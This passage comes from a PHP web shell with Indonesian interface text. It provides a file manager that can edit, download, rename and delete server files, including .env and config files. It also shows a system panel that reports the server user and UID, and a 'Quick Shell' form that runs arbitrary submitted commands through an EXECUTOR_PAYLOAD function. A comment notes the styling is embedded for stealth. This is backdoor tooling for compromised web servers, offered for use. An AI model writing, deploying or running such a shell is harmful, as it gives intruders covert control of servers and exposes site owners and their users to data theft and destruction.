            echo "<a href='?action=delete&file=" . urlencode($full_path) . "' style='color: #bf616a; margin-right: 10px;'>🗑️</a>";
        } else {
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            if (in_array($ext, ['php', 'html', 'js', 'css', 'txt', 'log', 'conf', 'ini', 'env'])) {
                echo "<a href='?action=edit&file=" . urlencode($full_path) . "' style='color: #5e81ac; margin-right: 10px;'>✏️</a>";
            }
            echo "<a href='?action=download&file=" . urlencode($full_path) . "' style='color: #a3be8c; margin-right: 10px;'>⬇️</a>";
            echo "<a href='?action=rename&path=" . urlencode($full_path) . "' style='color: #81a1c1; margin-right: 10px;'>✏️</a>";
            echo "<a href='?action=delete&file=" . urlencode($full_path) . "' style='color: #bf616a;'>🗑️</a>";
        }
        echo "</td>";
        echo "</tr>";
        
        if ($is_dir) $dir_count++;
        else $file_count++;
    }
    
    echo "</tbody>";
    echo "</table>";
    
    echo "<p style='margin-top: 15px; color: #a3be8c;'>📊 Total: <strong>$dir_count</strong> folder | <strong>$file_count</strong> file</p>";
} else {
    echo "<p style='color: #bf616a;'>Tidak dapat membaca direktori.</p>";
}

// ========================================
// # SYSTEM INFO PANEL
// ========================================
echo "<div style='margin-top: 30px; padding: 20px; background-color: #2e3440; border-radius: 8px;'>";
echo "<h3 style='color: #d8dee9; margin-top: 0;'>💻 Info Sistem</h3>";

echo "<div style='display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; font-size: 13px;'>";
echo "<div><strong>PHP Version:</strong> " . PHP_VERSION . "</div>";
echo "<div><strong>Server:</strong> " . htmlspecialchars($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "</div>";
echo "<div><strong>User:</strong> " . htmlspecialchars(get_current_user() ?? 'Unknown') . "</div>";
echo "<div><strong>UID/GID:</strong> " . getmyuid() . "/" . getmygid() . "</div>";
echo "<div><strong>Document Root:</strong> " . htmlspecialchars($_SERVER['DOCUMENT_ROOT'] ?? 'Unknown') . "</div>";
echo "<div><strong>Working Dir:</strong> " . htmlspecialchars(getcwd()) . "</div>";

// Test Shell Execution
$test_cmd = EXECUTOR_PAYLOAD('id');
if ($test_cmd !== false && !empty(trim($test_cmd))) {
    echo "<div style='color: #a3be8c;'><strong>Shell:</strong> ✅ AKTIF</div>";
    echo "<div style='font-size: 11px; color: #a3be8c;'><strong>ID:</strong> " . htmlspecialchars(substr($test_cmd, 0, 50)) . "...</div>";
} else {
    echo "<div style='color: #bf616a;'><strong>Shell:</strong> ❌ DISABLED</div>";
}

echo "</div>";

echo "<div style='margin-top: 15px; padding: 15px; background-color: #3b4252; border-radius: 6px; font-size: 12px;'>";
echo "<strong>Quick Shell:</strong> ";
echo "<form method='POST' style='display: inline;'>";
echo "<input type='text' name='quick_cmd' placeholder='id' style='width: 200px; padding: 4px; background-color: #4c566a; color: #d8dee9; border: 1px solid #5e81ac; border-radius: 3px;'>";
echo "<input type='submit' value='Run' style='padding: 4px 8px; background-color: #5e81ac; color: white; border: none; border-radius: 3px;'>";
echo "</form>";

if (isset($_POST['quick_cmd'])) {
    $quick_output = EXECUTOR_PAYLOAD(trim($_POST['quick_cmd']));
    if ($quick_output !== false) {
        echo "<div style='margin-top: 8px; padding: 8px; background-color: #242933; border-radius: 4px; font-family: Consolas; font-size: 11px; color: #a3be8c; max-height: 100px; overflow: auto;'>";
        echo htmlspecialchars($quick_output);
        echo "</div>";
    }
}

echo "</div>";
echo "</div>";

// ========================================
// # HELPER FUNCTIONS
// ========================================

function format_bytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    
    for ($i = 0; $bytes > 1024 && $i < count($units) - 1; $i++) {
        $bytes /= 1024;
    }
    
    return round($bytes, $precision) . ' ' . $units[$i];
}

// CSS Styling (Embedded untuk Stealth)
echo "<style>
body { 
    background-color: #1e1e2e; 
    color: #cdd6f4; 
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; 
    margin: 0; 
    padding: 20px; 
    line-height: 1.6;
}
.editor-container { 
    background-color: #2e3440; 
    padding: 20px; 
    border-radius: 8px; 
    margin: 20px 0;
}
code, pre { 
    background-color: #45475a; 
    padding: 4px 8px; 
    border-radius: 4px; 
    font-family: 'Fira Code', Consolas, monospace;
}
a { 
    transition: all 0.2s ease; 
}
a:hover { 
    text-decoration: underline !important; 
    opacity: 0.8; 
}
table a:hover { 
    text-decoration: none !important; 
}
input, textarea, select { 
    border-radius: 4px !important; 
}
@media (max-width: 768px) { 
    body { padding: 10px; } 
    table { font-size: 12px; } 
}
</style>";

?>
